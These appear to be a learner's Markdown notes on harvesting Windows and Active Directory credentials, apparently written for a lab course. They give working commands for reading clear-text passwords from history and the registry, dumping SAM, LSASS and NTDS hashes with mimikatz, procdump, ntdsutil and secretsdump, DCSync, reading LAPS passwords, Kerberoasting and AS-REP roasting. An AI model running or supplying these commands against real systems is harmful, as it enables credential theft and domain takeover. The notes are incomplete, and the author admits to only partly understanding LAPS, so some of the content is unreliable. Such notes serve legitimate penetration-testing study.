# 1-Find Clear-Text Files:
- **Powershell History**:
```
Path: C:\<UserName>\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
- **Registry: find password keyword**:
```
c:\Users\user> reg query HKLM /f password /t REG_SZ /s
C:\Users\user> reg query HKCU /f password /t REG_SZ /s
```
- **Also look for:**
  - Database Files
  - Memory Dump
  - Active Directory.Users' description
  - Network Sniffing

# 2-Key Logging

# 3-SAM Database:
  - Path: c:\Windows\System32\config\sam
  - we can not read it and copy it
  - SAM database is encrypted either with RC4 or AES.we need a decryption key which is also stored in the files system in **c:\Windows\System32\Config\system** 
    ### how to Dump:
    - 1-MetaSploit.hashdump
    - 2-Microsoft Volume shadow copy:
        ```
        wmic shadowcopy call create Volume='C:\'
        #find where it is stored
        vssadmin list shadows
        copy \\path\to\volume\sam  \\somewhere-Else
        copy \\path\to\volume\\system \\soemwhere-Else
        ```
# 4-Registry Hives:
```
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
#Extract
secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

# 5-Dump LSASS(cached credentials):
  - **Protected LSASS**:
    - disable from Registry:
    ```
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    ```
    - disable with mimikatz:
    ```
    mimikatz # !+
    mimikatz # !processprotect /process:lsass.exe /remove
    ```

  - 5.1-Using GUI with Task-Manager
  - 5.2-Using procdump
  ```
  procdump.exe -accepteula -ma lsass.exe c:\<somewhere>
  ```
  - 5.3-mimikatz
  ```
  mimikatz # sekurlsa::logonpasswords
  ```
  
# 6-Windows Credential Manager:
  - Stored Credentials in system:
  ```
  vaultcmd /list
  VaultCmd /listproperties:"Web Credentials"
  VaultCmd /listcreds:"Web Credentials"
  VaultCmd /listproperties:"Windows Credentials"
  VaultCmd /listcreds:"Windows Credentials"
  cmdkey /list
  runas /savecred /user:<Domain>\Username cmd.exe
  mimikatz # sekurlsa::credman
  ```
    - The VaultCmd is not able to show the password. we can use this tools [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)
      ```
      Import-Module C:\Tools\Get-WebCredentials.ps1
      Get-WebCredentials
      ```
# 7-NTDS:
  - **Local**:
    - we need the following files:
        - C:\Windows\NTDS\ntds.dit
        - C:\Windows\System32\config\SYSTEM
        - C:\Windows\System32\config\SECURITY
    - with Powershell:
    ```
    #Dump
    powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
    #Extract
    secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
    ```
  - **Remote(DCSync)**:
    ```
    #dump NTDS
    lsadump::dcsync /domain:<DomainName> /all
    #Extract just NTDS data
    secretsdump.py -just-dc <DomainName>/<AD_Admin_User>@MACHINE_IP 
    #Extract NTLM hashes
    secretsdump.py -just-dc-ntlm <DomainName>/<AD_Admin_User>@MACHINE_IP
    ```
# 8-LAPS(im not understand it completely):
- GPP:
  - **Microsoft implemented a method to change local administrator accounts across workstations using Group Policy Preferences (GPP)**
  - GPP is a tool that allows administrators to create domain policies with embedded credentials.
  - Once the GPP is deployed, different XML files are created in the SYSVOL folder.
  - The issue was the GPP relevant XML files contained a password encrypted using AES-256 bit encryption, but Microsoft somehow published its private key
  - Since Domain users can read the content of the SYSVOL folder, it becomes easy to decrypt the stored passwords
- LAPS:
   - LAPS uses **admpwd.dll** to change the local administrator password and update the value of **ms-mcs-AdmPwd**
   - **ms-mcs-AdmPwd** attribute **contains** a clear-text **password** of the local administrator
   ```
   #check if LAPS is installed or not
   dir "C:\Program Files\LAPS\CSE"
   #check the available commands to use for AdmPwd cmdlets 
   Get-Command *AdmPwd*
   #find the right OU
   Find-AdmPwdExtendedRights -Identity *
   #login to proper user and:
   Get-AdmPwdPassword -ComputerName <computerName>
   ```
# 9-Kerberoasting:
  - In order for this attack to work, an adversary must have access to SPN (Service Principal Name) accounts such as IIS User, MSSQL, etc. The Kerberoasting attack involves requesting a Ticket Granting Ticket (TGT) and Ticket Granting Service (TGS).
    ```
    #look for SPN
    impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User
    #we can send a single request to get a TGS ticket for the target user that has SPN, since TGS is encrypted with target-user credentials we can crack it and Done!
    impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP <DomainName>/User -request-user Target-user
    ```
    
# 10-AS-REP Roasting:
  - First We need to find users with "Do not require Kerberos preauthentication" attribute
  - if we find any, it enables the attacker to retrieve password hashes for AD users
  ```
  impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP <DomainName>/ -usersfile /tmp/users.txt
  ```
  
  
# 11-LLMNR/NBNS Poisoning  
